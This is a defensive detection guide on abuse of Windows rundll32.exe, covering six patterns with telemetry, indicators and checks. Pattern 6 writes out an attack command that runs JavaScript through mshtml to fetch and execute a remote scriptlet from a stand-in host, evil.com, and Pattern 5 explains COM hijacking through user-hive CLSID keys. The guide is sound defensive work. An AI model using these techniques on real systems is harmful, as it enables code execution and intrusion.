## Summary
---
**What it is:** Detection of suspicious or malicious use of rundll32.exe — a legitimate Windows binary commonly abused to proxy execution of malicious code through DLLs, COM objects, scripts, and control panel items.

**Scope:** Covers detection of rundll32.exe abuse across six patterns: basic DLL execution, shell32.dll abuse, Control Panel item (.CPL) abuse, WebDAV-triggered execution via davclnt.dll, COM object invocation via `-sta` / `-localserver` flags, and JavaScript/HTML execution via mshtml.dll. Does not cover DLL hijacking as a separate technique.

**Prerequisites:**

- Understanding of Windows DLL loading and the rundll32.exe binary
- Familiarity with COM objects and the Windows registry structure
- Sysmon deployed with process creation and registry event logging enabled
- Windows Security auditing enabled (Process Creation, Logon, Registry)

## How It Works (2–4 lines)
---
`rundll32.exe` is a signed Windows binary designed to load and execute functions exported from DLL files, making it trusted by default on most endpoints and allowlisted by many security controls. Because it is a legitimate system binary, adversaries abuse it to proxy execution — running malicious DLLs, invoking COM objects, executing JavaScript, or loading Control Panel items — all under the cover of a trusted process. Defenders detect abuse primarily through anomalous command-line arguments, unexpected parent-child process relationships, unusual DLL paths, network connections from rundll32.exe, and suspicious registry modifications under `HKCR\CLSID`.

## Detection Workflow
---
### Required Telemetry

- **Sysmon Event ID 1** — Process creation (command-line arguments)
- **Sysmon Event ID 3** — Network connections originating from rundll32.exe
- **Sysmon Event ID 12 / 13** — Registry create/set events under CLSID keys
- **Sysmon Event ID 22** — DNS queries
- **Windows Security Event ID 4688** — Process creation with command line (if Sysmon unavailable)
- **EDR telemetry** — DLL load events, parent-process chains
### Pattern 1 — Basic DLL Execution
---

**What to look for:**
- `rundll32.exe` executing DLLs from unusual paths (outside `System32`, `SysWOW64`, or known application directories)
- DLL file hash not matching known-good baseline

**Verify:**
- DLL path: expected locations are `C:\Windows\System32\` and `C:\Windows\SysWOW64\`
- File hash via VirusTotal or internal threat intel
- Parent process: is it a known legitimate caller?

**Suspicious indicators:**
- DLL loaded from `%TEMP%`, `%APPDATA%`, `%PUBLIC%`, or user-writable paths
- DLL with a double extension (e.g., `document.pdf.dll`)
- rundll32.exe with no arguments or with encoded arguments
### Pattern 2 — shell32.dll Abuse (`OpenAs_RunDLL`, `ShellExec_RunDLL`)
---

**Expected legitimate behavior:**
```
explorer.exe
   └── rundll32.exe shell32.dll,OpenAs_RunDLL <file>
```

**Suspicious indicators:**
- Parent process is NOT `explorer.exe`
- `ShellExec_RunDLL` called with encoded or obfuscated arguments
- PowerShell → rundll32.exe → shell32.dll chain (common in obfuscated payloads)

**Verify:**
- Shell32.dll path: must be `C:\Windows\System32\shell32.dll`
- Hash of shell32.dll if path looks correct but behavior is anomalous

### Pattern 3 — Control Panel Item Abuse (`Control_RunDLL`, `.CPL` files)
---

**Expected legitimate behavior:**
```C
rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\Windows\System32\timedate.cpl
```

**Suspicious indicators:**

- `.CPL` file loaded from non-system path (e.g., Downloads, Temp)
- `.CPL` file with mismatched extension (it is a DLL — verify hash)
- `Control_RunDLL` or `Control_RunDLLAsUser` with unusual arguments
- Double-clicking an unknown `.CPL` file triggers rundll32.exe unexpectedly

**Verify:**
- Path and hash of the `.cpl` file supplied
- Parent process context

### Pattern 4 — WebDAV Triggered Execution (`davclnt.dll,DavSetCookie`)
---

**Expected legitimate behavior:**
```C
svchost.exe -k LocalService -p -s WebClient
   └── rundll32.exe C:\Windows\System32\davclnt.dll,DavSetCookie <Host> <Share>
```
Triggered when Windows resolves `file://` UNC paths using the WebDAV client (when SMB is disabled or blocked).

**Suspicious indicators:**
- `<Host>` in the command line resolves to an external or unknown IP/domain
- Parent process is NOT `svchost.exe` running the WebClient service
- Triggered by a document opening (Word, Excel, PDF) — potential credential capture attempt

**Verify:**
- The `<Host>` value in the command line — look up in threat intel
- Parent process chain: document opener → svchost.exe → rundll32.exe
### Pattern 5 — COM Object Invocation (`-sta` / `-localserver` flags)
---

**What is happening:**
When rundll32.exe is called with `-sta {CLSID}` or `-localserver {CLSID}`, it looks up the CLSID in the registry under `HKCR\CLSID\<GUID>` and loads whatever binary is registered under `InprocServer32` (DLL) or `LocalServer32` (EXE). If an attacker has registered a malicious COM class — or replaced an abandoned/orphaned vendor CLSID — the payload executes inside the rundll32.exe process with no obvious standalone executable. This technique is documented by [@bohops](https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/) and the `-localserver` variant by [Hexacorn](https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/).

**Command patterns:**
```
rundll32.exe -sta {CLSID-GUID}
rundll32.exe -localserver {CLSID-GUID}
```

**Suspicious indicators:**
- Sysmon Event ID 13: registry write to `HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32` pointing to a non-standard DLL path
- rundll32.exe with `-sta` or `-localserver` flag in command line (rare in legitimate use)
- CLSID registered under `HKCU` (user hive) rather than `HKLM` — user-writable, no admin needed
- `InprocServer32` or `LocalServer32` value pointing to writable paths (Temp, AppData)
- rundll32.exe spawning unexpected child processes after CLSID invocation

**Registry paths to monitor:**
```C
HKCU\SOFTWARE\Classes\CLSID\{*}\InprocServer32
HKCR\CLSID\{*}\InprocServer32
HKCR\CLSID\{*}\LocalServer32
```

**Verify:**
- Look up the CLSID — is it a known Windows or vendor COM class?
- Check what binary the registry key points to and verify its path and hash
- Cross-reference with known orphaned/abandoned CLSIDs if vendor software was recently uninstalled
### Pattern 6 — JavaScript / HTML Execution via mshtml.dll
---

**Command pattern:**

```C
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication <code or URL>
```

Can also fetch and execute remote scriptlets:

```C
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://evil.com/payload.sct")"
```

**Suspicious indicators:**

- `javascript:` keyword anywhere in rundll32.exe command line — no legitimate use case
- `mshtml` or `RunHTMLApplication` in command line
- `GetObject` with a remote URL — indicates remote script fetch
- rundll32.exe making outbound HTTP/HTTPS connections (Sysmon Event ID 3)
- Spawning `wscript.exe`, `cscript.exe`, `powershell.exe`, or `cmd.exe` as children

A **HIGH CHANCE** of malicious.
